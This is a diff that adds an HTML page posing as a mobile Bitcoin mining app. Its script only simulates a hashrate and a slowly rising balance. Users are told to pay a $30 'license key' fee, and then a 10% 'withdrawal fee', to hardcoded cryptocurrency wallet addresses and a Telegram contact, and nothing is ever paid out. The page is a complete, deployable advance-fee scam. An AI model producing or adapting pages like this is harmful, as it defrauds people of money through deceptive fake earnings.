@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>BITCOIN MINER · MOBILE X9</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #03050b;
+            min-height: 100vh;
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            padding: 8px;
+        }
+
+        /* mobile first container */
+        .mobile-miner {
+            max-width: 480px;
+            width: 100%;
+            background: #0b111f;
+            border-radius: 32px;
+            border: 1px solid #f7931a30;
+            box-shadow: 0 20px 40px -15px #000, 0 0 0 1px #f7931a20 inset;
+            overflow: hidden;
+            padding: 16px 12px 20px 12px;
+            position: relative;
+        }
+
+        /* header */
+        .m-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #0e1629;
+            padding: 12px 16px;
+            border-radius: 40px;
+            border: 1px solid #f7931a40;
+            margin-bottom: 16px;
+        }
+
+        .m-logo h2 {
+            font-size: 1.2rem;
+            font-weight: 800;
+            background: linear-gradient(145deg, #ffd88a, #f7931a);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .m-stats {
+            display: flex;
+            gap: 15px;
+        }
+
+        .m-stat {
+            text-align: right;
+        }
+
+        .m-stat .val {
+            font-size: 1rem;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            color: #fbb13c;
+        }
+
+        .m-stat .lbl {
+            font-size: 0.6rem;
+            color: #8ba0c7;
+        }
+
+        /* miner hardware */
+        .m-rig {
+            background: #0c1422;
+            border-radius: 28px;
+            border: 2px solid #f7931a30;
+            padding: 18px 14px;
+            margin-bottom: 16px;
+            box-shadow: 0 15px 20px -10px #000, inset 0 -2px 8px #00000080;
+        }
+
+        .m-fans {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 6px;
+            margin-bottom: 18px;
+        }
+
+        .m-fan {
+            aspect-ratio: 1;
+            background: #19273f;
+            border-radius: 50%;
+            border: 2px solid #f7931a;
+            box-shadow: 0 5px 10px #000, inset 0 -3px 5px black;
+            position: relative;
+            animation: fan-spin 3s linear infinite;
+            animation-play-state: paused;
+        }
+
+        .m-rig.mining .m-fan {
+            animation-play-state: running;
+        }
+
+        @keyframes fan-spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .m-fan::after {
+            content: '';
+            position: absolute;
+            width: 30%;
+            height: 30%;
+            background: #0d1a2b;
+            border-radius: 50%;
+            top: 35%;
+            left: 35%;
+            border: 2px solid #f7931a;
+        }
+
+        .m-display {
+            background: #030917;
+            border: 2px solid #f7931a;
+            border-radius: 20px;
+            padding: 16px;
+        }
+
+        .m-row {
+            display: flex;
+            justify-content: space-between;
+            color: #ffdb9f;
+            font-size: 0.9rem;
+            padding: 6px 0;
+            border-bottom: 1px solid #f7931a30;
+        }
+
+        /* key panel */
+        .m-key-panel {
+            background: #101a2c;
+            border-radius: 30px;
+            border: 2px solid #f7931a;
+            padding: 22px 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 0 25px #f7931a30;
+        }
+
+        .m-key-title {
+            text-align: center;
+            font-size: 1.3rem;
+            font-weight: 800;
+            color: #f7931a;
+            margin-bottom: 15px;
+        }
+
+        .m-key-input {
+            background: #030b18;
+            border: 2px solid #f7931a;
+            border-radius: 50px;
+            padding: 3px;
+            margin-bottom: 15px;
+        }
+
+        .m-key-input input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 18px 12px;
+            font-size: 1.3rem;
+            letter-spacing: 4px;
+            font-family: 'Courier New', monospace;
+            color: #f7931a;
+            text-align: center;
+            outline: none;
+        }
+
+        .m-key-input input::placeholder {
+            color: #2f4060;
+            font-size: 0.9rem;
+            letter-spacing: 2px;
+        }
+
+        .m-unlock {
+            background: #f7931a;
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            color: #030813;
+            border: 2px solid #ffc107;
+            box-shadow: 0 6px 0 #9b5300;
+            margin-bottom: 12px;
+            cursor: pointer;
+        }
+
+        .m-unlock:active {
+            transform: translateY(4px);
+            box-shadow: 0 2px 0 #9b5300;
+        }
+
+        .m-status {
+            text-align: center;
+            color: #97afd4;
+            font-size: 0.85rem;
+        }
+
+        /* mining controls */
+        .m-controls {
+            display: flex;
+            gap: 10px;
+            margin: 16px 0;
+        }
+
+        .m-ctrl {
+            flex: 1;
+            padding: 16px;
+            border-radius: 40px;
+            background: #1b2740;
+            border: 2px solid #3e5680;
+            color: white;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+
+        .m-ctrl.active {
+            background: #1f8b4c;
+            border-color: #8affa0;
+            box-shadow: 0 0 20px #00ff88;
+        }
+
+        /* withdrawal card - UPDATED */
+        .m-withdraw {
+            background: #0f182b;
+            border-radius: 28px;
+            border: 2px solid #f7931a60;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+
+        .m-balance {
+            font-size: 2rem;
+            font-family: 'Courier New', monospace;
+            color: #fbb860;
+            text-align: center;
+            word-break: break-word;
+            margin-bottom: 15px;
+        }
+
+        .withdraw-address-input {
+            background: #030b18;
+            border: 2px solid #f7931a60;
+            border-radius: 50px;
+            margin: 15px 0;
+        }
+
+        .withdraw-address-input input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 16px 18px;
+            font-size: 0.9rem;
+            color: white;
+            outline: none;
+        }
+
+        .withdraw-address-input input::placeholder {
+            color: #4a6180;
+        }
+
+        .m-withdraw-btn {
+            background: #c0392b;
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: white;
+            border: 2px solid #ff7062;
+            box-shadow: 0 5px 0 #6b1f1f;
+            margin-top: 5px;
+            cursor: pointer;
+        }
+
+        .m-withdraw-btn:active {
+            transform: translateY(3px);
+            box-shadow: 0 2px 0 #6b1f1f;
+        }
+
+        .m-min-note {
+            text-align: center;
+            color: #f7931a;
+            font-size: 0.75rem;
+            margin-top: 12px;
+        }
+
+        /* payment methods */
+        .m-payments {
+            background: #0e1729;
+            border-radius: 30px;
+            border: 1px solid #f7931a60;
+            padding: 20px 12px;
+        }
+
+        .m-pay-title {
+            font-size: 1.2rem;
+            color: #fbd998;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .m-pay-badge {
+            background: #f7931a;
+            color: black;
+            padding: 5px 12px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 0.8rem;
+        }
+
+        .m-pay-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-height: 300px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .m-pay-card {
+            background: #121f34;
+            border: 1px solid #f7931a40;
+            border-radius: 20px;
+            padding: 14px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .m-pay-card:active {
+            background: #1c2d47;
+            border-color: #f7931a;
+            transform: scale(0.98);
+        }
+
+        .m-pay-coin {
+            font-weight: 700;
+            color: #f7931a;
+            font-size: 1rem;
+            margin-bottom: 4px;
+        }
+
+        .m-pay-price {
+            font-size: 0.8rem;
+            color: #c7d9ff;
+        }
+
+        /* address modal */
+        .address-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            backdrop-filter: blur(8px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            z-index: 1000;
+        }
+
+        .address-modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #0f1b2f;
+            border-radius: 40px;
+            padding: 28px 20px;
+            max-width: 420px;
+            width: 100%;
+            border: 3px solid #f7931a;
+            box-shadow: 0 0 50px #f7931a;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .modal-coin {
+            font-size: 2rem;
+            color: #f7931a;
+            text-align: center;
+            margin-bottom: 5px;
+            font-weight: 800;
+        }
+
+        .modal-price {
+            font-size: 1.5rem;
+            color: white;
+            text-align: center;
+            margin-bottom: 20px;
+            background: #1f3450;
+            padding: 8px;
+            border-radius: 40px;
+        }
+
+        .modal-instruction {
+            background: #1a2a42;
+            border-radius: 20px;
+            padding: 18px;
+            margin: 15px 0;
+            border-left: 5px solid #f7931a;
+        }
+
+        .modal-instruction p {
+            color: #ffdb9f;
+            font-size: 0.95rem;
+            margin-bottom: 10px;
+            line-height: 1.5;
+        }
+
+        .modal-instruction ul {
+            color: #b7d0ff;
+            padding-left: 20px;
+            font-size: 0.9rem;
+        }
+
+        .modal-instruction li {
+            margin: 8px 0;
+        }
+
+        .modal-address-label {
+            color: #8aa9e0;
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+
+        .modal-address {
+            background: #030f1f;
+            border-radius: 20px;
+            padding: 18px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            word-break: break-all;
+            color: #ffd78a;
+            border: 2px solid #f7931a60;
+            margin: 10px 0 20px 0;
+            line-height: 1.5;
+        }
+
+        .modal-copy {
+            background: #f7931a;
+            border: none;
+            padding: 18px;
+            border-radius: 50px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            width: 100%;
+            margin-bottom: 10px;
+            cursor: pointer;
+            color: #030813;
+            border: 2px solid #ffc107;
+        }
+
+        .modal-copy:active {
+            transform: scale(0.98);
+        }
+
+        .modal-close {
+            background: #2f405b;
+            border: none;
+            padding: 16px;
+            border-radius: 50px;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            width: 100%;
+            cursor: pointer;
+            border: 1px solid #5f7cb0;
+        }
+
+        .key-receive-note {
+            background: #1e3a3a;
+            border-radius: 15px;
+            padding: 12px;
+            margin: 15px 0;
+            text-align: center;
+            color: #a5ffa5;
+            font-size: 0.9rem;
+            border: 1px solid #5aff5a;
+        }
+
+        /* telegram */
+        .m-telegram {
+            background: #1f314b;
+            border-radius: 40px;
+            padding: 15px 18px;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 2px solid #f7931a;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .m-telegram span {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: white;
+        }
+
+        .m-telegram a {
+            background: #0088cc;
+            padding: 8px 16px;
+            border-radius: 30px;
+            color: white;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 0.9rem;
+            white-space: nowrap;
+        }
+
+        /* animations */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.2s ease-in-out;
+        }
+
+        .highlight {
+            color: #f7931a;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+    <div class="mobile-miner" id="app">
+        <!-- header -->
+        <div class="m-header">
+            <div class="m-logo">
+                <h2>⚡ X9 MOBILE</h2>
+            </div>
+            <div class="m-stats">
+                <div class="m-stat">
+                    <div class="val" id="balanceDisplay">0.000000</div>
+                    <div class="lbl">BTC</div>
+                </div>
+                <div class="m-stat">
+                    <div class="val" id="hashDisplay">0.0</div>
+                    <div class="lbl">TH/s</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- mining rig -->
+        <div class="m-rig" id="minerRig">
+            <div class="m-fans">
+                <div class="m-fan"></div>
+                <div class="m-fan"></div>
+                <div class="m-fan"></div>
+                <div class="m-fan"></div>
+            </div>
+            <div class="m-display">
+                <div class="m-row"><span>HASHRATE</span><span id="rigHash">0.00 TH/s</span></div>
+                <div class="m-row"><span>TEMP</span><span>51°C/54°C</span></div>
+                <div class="m-row"><span>DAY REWARD</span><span id="dailyReward">$0</span></div>
+            </div>
+        </div>
+
+        <!-- key panel -->
+        <div class="m-key-panel">
+            <div class="m-key-title">🔐 UNLOCK MINER</div>
+            <div class="m-key-input">
+                <input type="text" id="keyInput" maxlength="10" placeholder="ENTER KEY" autocomplete="off">
+            </div>
+            <button class="m-unlock" id="unlockBtn">ACTIVATE LICENSE</button>
+            <div class="m-status" id="keyStatus">⛔ rig locked · key required $30</div>
+        </div>
+
+        <!-- mining controls -->
+        <div class="m-controls">
+            <button class="m-ctrl" id="startBtn">▶ START</button>
+            <button class="m-ctrl" id="stopBtn">⏹ STOP</button>
+        </div>
+
+        <!-- withdrawal - UPDATED with address input -->
+        <div class="m-withdraw">
+            <div class="m-balance" id="btcDisplay">0.00000000 BTC</div>
+            
+            <div class="withdraw-address-input">
+                <input type="text" id="withdrawAddress" placeholder="Enter your BTC address" value="">
+            </div>
+            
+            <button class="m-withdraw-btn" id="withdrawBtn">REQUEST WITHDRAWAL</button>
+            <div class="m-min-note">minimum 0.003 BTC · 10% fee applies</div>
+        </div>
+
+        <!-- payment methods -->
+        <div class="m-payments">
+            <div class="m-pay-title">
+                <span>💳 PAYMENT METHODS</span>
+                <span class="m-pay-badge">$30 KEY</span>
+            </div>
+            <div class="m-pay-grid" id="paymentList"></div>
+            
+            <div class="m-telegram">
+                <span>📲 @CryptoMinerApp10</span>
+                <a href="https://t.me/CryptoMinerApp10" target="_blank">SEND PROOF</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- address modal -->
+    <div class="address-modal" id="addressModal">
+        <div class="modal-content">
+            <div class="modal-coin" id="modalCoin">Bitcoin</div>
+            <div class="modal-price" id="modalPrice">0.00041 BTC</div>
+            
+            <div class="modal-instruction">
+                <p>📋 <span class="highlight">HOW TO PAY:</span></p>
+                <ul>
+                    <li>Send <span class="highlight" id="instructionPrice">0.00041 BTC</span> to below address</li>
+                    <li>Use <span class="highlight" id="instructionNetwork">Bitcoin network</span></li>
+                    <li>Minimum 1 confirmation required</li>
+                    <li>Take screenshot of transaction</li>
+                    <li>Send screenshot + TXID to <span class="highlight">@CryptoMinerApp10</span> on Telegram</li>
+                </ul>
+            </div>
+            
+            <div class="key-receive-note">
+                ⭐ After payment confirmation, you will receive your unique license key from @CryptoMinerApp10
+            </div>
+            
+            <div class="modal-address-label">💳 DEPOSIT ADDRESS:</div>
+            <div class="modal-address" id="modalAddress">bc1qkrvuxrrjm9t96jdng86mhep29rvf4ezupepakx</div>
+            
+            <button class="modal-copy" id="copyBtn">📋 COPY ADDRESS</button>
+            <button class="modal-close" id="closeModal">CLOSE</button>
+        </div>
+    </div>
+
+    <!-- withdrawal confirmation modal -->
+    <div class="address-modal" id="withdrawModal">
+        <div class="modal-content">
+            <div class="modal-coin">💰 WITHDRAWAL REQUEST</div>
+            
+            <div class="modal-instruction">
+                <p>📋 <span class="highlight">STEP 1: PAY FEE</span></p>
+                <ul>
+                    <li>Send <span class="highlight" id="feeAmount">0.000000 BTC</span> to below address</li>
+                    <li>Use <span class="highlight">Bitcoin network</span></li>
+                    <li>This is 10% processing fee</li>
+                    <li>Your withdrawal: <span class="highlight" id="netAmount">0.000000 BTC</span></li>
+                </ul>
+            </div>
+            
+            <div class="modal-address-label">💳 FEE PAYMENT ADDRESS:</div>
+            <div class="modal-address" id="feeAddress">bc1qkrvuxrrjm9t96jdng86mhep29rvf4ezupepakx</div>
+            
+            <button class="modal-copy" id="copyFeeBtn">📋 COPY FEE ADDRESS</button>
+            
+            <div class="key-receive-note" style="margin-top: 15px;">
+                ⭐ After sending fee, take screenshot and send to @CryptoMinerApp10 with your withdrawal address to receive funds
+            </div>
+            
+            <button class="modal-close" id="closeWithdrawModal" style="margin-top: 10px;">CLOSE</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // hidden key
+            const VALID_KEY = "HMR13006";
+            
+            // state
+            let unlocked = false;
+            let mining = false;
+            let btc = 0.0;
+            let interval = null;
+            
+            // DOM
+            const minerRig = document.getElementById('minerRig');
+            const keyInput = document.getElementById('keyInput');
+            const unlockBtn = document.getElementById('unlockBtn');
+            const keyStatus = document.getElementById('keyStatus');
+            const startBtn = document.getElementById('startBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            const btcDisplay = document.getElementById('btcDisplay');
+            const balanceDisplay = document.getElementById('balanceDisplay');
+            const hashDisplay = document.getElementById('hashDisplay');
+            const rigHash = document.getElementById('rigHash');
+            const dailyReward = document.getElementById('dailyReward');
+            const withdrawBtn = document.getElementById('withdrawBtn');
+            const withdrawAddress = document.getElementById('withdrawAddress');
+            
+            // modal elements
+            const modal = document.getElementById('addressModal');
+            const modalCoin = document.getElementById('modalCoin');
+            const modalPrice = document.getElementById('modalPrice');
+            const modalAddress = document.getElementById('modalAddress');
+            const instructionPrice = document.getElementById('instructionPrice');
+            const instructionNetwork = document.getElementById('instructionNetwork');
+            const copyBtn = document.getElementById('copyBtn');
+            const closeModal = document.getElementById('closeModal');
+            
+            // withdraw modal elements
+            const withdrawModal = document.getElementById('withdrawModal');
+            const feeAmount = document.getElementById('feeAmount');
+            const netAmount = document.getElementById('netAmount');
+            const feeAddress = document.getElementById('feeAddress');
+            const copyFeeBtn = document.getElementById('copyFeeBtn');
+            const closeWithdrawModal = document.getElementById('closeWithdrawModal');
+
+            // full payment data with network info
+            const payments = [
+                { 
+                    coin: "Bitcoin", 
+                    address: "bc1qkrvuxrrjm9t96jdng86mhep29rvf4ezupepakx", 
+                    price: "0.00041 BTC",
+                    network: "Bitcoin (BTC)"
+                },
+                { 
+                    coin: "USDT-BEP20", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "30 USDT",
+                    network: "BNB Smart Chain (BEP20)"
+                },
+                { 
+                    coin: "USDT-POL", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "30 USDT",
+                    network: "Polygon"
+                },
+                { 
+                    coin: "USDT-TRC20", 
+                    address: "TNF2n1mc56nbXwHi1FXrXckXc74RWuYDux", 
+                    price: "40 USDT",
+                    network: "TRON (TRC20)"
+                },
+                { 
+                    coin: "USDT-ERC20", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "30 USDT",
+                    network: "Ethereum (ERC20)"
+                },
+                { 
+                    coin: "Toncoin", 
+                    address: "UQDwLjzEqoCRkfGHyyPf7ltrf77ns0uJ-M6L9AY_o2jrcvtM", 
+                    price: "26 TON",
+                    network: "TON"
+                },
+                { 
+                    coin: "BNB", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "0.045 BNB",
+                    network: "BNB Smart Chain"
+                },
+                { 
+                    coin: "Ethereum", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "0.013 ETH",
+                    network: "Ethereum"
+                },
+                { 
+                    coin: "TRX", 
+                    address: "TNF2n1mc56nbXwHi1FXrXckXc74RWuYDux", 
+                    price: "100 TRX",
+                    network: "TRON"
+                },
+                { 
+                    coin: "Polygon", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "306 POL",
+                    network: "Polygon"
+                },
+                { 
+                    coin: "Solana", 
+                    address: "BJRbjgLW13DwKkJvCTyXG9WTZoNVB4FQRsBKh4jN3TPH", 
+                    price: "0.33 SOL",
+                    network: "Solana"
+                },
+                { 
+                    coin: "Dogecoin", 
+                    address: "DBdHkdK9cSnTsbSU7fC3UsEScGk3Vh5MQj", 
+                    price: "309 Doge",
+                    network: "Dogecoin"
+                },
+                { 
+                    coin: "USDC-SOL", 
+                    address: "BJRbjgLW13DwKkJvCTyXG9WTZoNVB4FQRsBKh4jN3TPH", 
+                    price: "30 USDC",
+                    network: "Solana"
+                },
+                { 
+                    coin: "USDC-ERC20", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "30 USDC",
+                    network: "Ethereum (ERC20)"
+                },
+                { 
+                    coin: "USDC-BEP20", 
+                    address: "0x8Ed272B8003eC72F434929EB7E712dea2772A360", 
+                    price: "30 USDC",
+                    network: "BNB Smart Chain (BEP20)"
+                },
+            ];
+
+            // render payment cards
+            const container = document.getElementById('paymentList');
+            payments.forEach(p => {
+                const card = document.createElement('div');
+                card.className = 'm-pay-card';
+                card.innerHTML = `
+                    <div class="m-pay-coin">${p.coin}</div>
+                    <div class="m-pay-price">💰 ${p.price}</div>
+                `;
+                
+                card.addEventListener('click', () => {
+                    modalCoin.innerText = p.coin;
+                    modalPrice.innerText = p.price;
+                    modalAddress.innerText = p.address;
+                    instructionPrice.innerText = p.price;
+                    instructionNetwork.innerText = p.network || p.coin;
+                    modal.classList.add('show');
+                });
+                
+                container.appendChild(card);
+            });
+
+            // copy address
+            copyBtn.addEventListener('click', () => {
+                navigator.clipboard.writeText(modalAddress.innerText).then(() => {
+                    alert('✅ Address copied to clipboard!');
+                }).catch(() => {
+                    alert('❌ Copy failed. Please select and copy manually.');
+                });
+            });
+
+            // close modal
+            closeModal.addEventListener('click', () => {
+                modal.classList.remove('show');
+            });
+
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.classList.remove('show');
+                }
+            });
+
+            // copy fee address
+            copyFeeBtn.addEventListener('click', () => {
+                navigator.clipboard.writeText(feeAddress.innerText).then(() => {
+                    alert('✅ Fee address copied!');
+                });
+            });
+
+            // close withdraw modal
+            closeWithdrawModal.addEventListener('click', () => {
+                withdrawModal.classList.remove('show');
+            });
+
+            withdrawModal.addEventListener('click', (e) => {
+                if (e.target === withdrawModal) {
+                    withdrawModal.classList.remove('show');
+                }
+            });
+
+            // update UI
+            function refreshUI() {
+                balanceDisplay.innerText = btc.toFixed(6);
+                btcDisplay.innerText = btc.toFixed(8) + ' BTC';
+                
+                let hr = 0;
+                if (mining && unlocked) {
+                    hr = 112.3 + (Math.random() * 1.2);
+                }
+                hashDisplay.innerText = hr.toFixed(1);
+                rigHash.innerText = hr.toFixed(2) + ' TH/s';
+                
+                dailyReward.innerText = (mining && unlocked) ? '$40' : '$0';
+                
+                if (mining && unlocked) {
+                    minerRig.classList.add('mining');
+                } else {
+                    minerRig.classList.remove('mining');
+                }
+            }
+
+            // mining loop
+            function startMiningLoop() {
+                if (interval) clearInterval(interval);
+                interval = setInterval(() => {
+                    if (mining && unlocked) {
+                        btc += 0.0000000132;
+                        refreshUI();
+                    }
+                }, 2000);
+            }
+
+            // unlock
+            unlockBtn.addEventListener('click', () => {
+                const entered = keyInput.value.trim();
+                
+                if (entered === VALID_KEY) {
+                    unlocked = true;
+                    keyStatus.innerHTML = '✅ RIG UNLOCKED · LICENSE ACTIVE';
+                    keyStatus.style.color = '#7aff87';
+                    keyInput.style.borderColor = '#00ff88';
+                    
+                    minerRig.style.boxShadow = '0 0 30px #f7931a';
+                    setTimeout(() => minerRig.style.boxShadow = '', 400);
+                } else {
+                    unlocked = false;
+                    keyStatus.innerHTML = '❌ INVALID KEY · BUY $30 FROM TELEGRAM';
+                    keyStatus.style.color = '#ff7b7b';
+                    
+                    keyInput.classList.add('shake');
+                    setTimeout(() => keyInput.classList.remove('shake'), 300);
+                }
+                refreshUI();
+            });
+
+            // start mining
+            startBtn.addEventListener('click', () => {
+                if (!unlocked) {
+                    alert('🔒 UNLOCK MINER FIRST WITH VALID KEY');
+                    return;
+                }
+                mining = true;
+                startBtn.classList.add('active');
+                stopBtn.classList.remove('active');
+                startMiningLoop();
+                refreshUI();
+            });
+
+            // stop mining
+            stopBtn.addEventListener('click', () => {
+                mining = false;
+                stopBtn.classList.add('active');
+                startBtn.classList.remove('active');
+                refreshUI();
+            });
+
+            // withdrawal with fee payment
+            withdrawBtn.addEventListener('click', () => {
+                const userAddress = withdrawAddress.value.trim();
+                
+                if (btc < 0.003) {
+                    alert(`❌ Need 0.003 BTC minimum. Current: ${btc.toFixed(8)} BTC`);
+                    return;
+                }
+                
+                if (!userAddress) {
+                    alert('❌ Please enter your Bitcoin address');
+                    return;
+                }
+                
+                if (!userAddress.startsWith('1') && !userAddress.startsWith('3') && !userAddress.startsWith('bc1')) {
+                    alert('❌ Please enter a valid Bitcoin address');
+                    return;
+                }
+                
+                const fee = btc * 0.1;
+                const net = btc - fee;
+                
+                // show fee payment modal
+                feeAmount.innerText = fee.toFixed(8) + ' BTC';
+                netAmount.innerText = net.toFixed(8) + ' BTC';
+                withdrawModal.classList.add('show');
+                
+                // store withdrawal data for after fee payment
+                window.pendingWithdrawal = {
+                    amount: btc,
+                    fee: fee,
+                    net: net,
+                    address: userAddress
+                };
+            });
+
+            // enter key shortcut
+            keyInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') unlockBtn.click();
+            });
+
+            // initial state
+            stopBtn.classList.add('active');
+            refreshUI();
+        })();
+    </script>
+</body>
+</html>
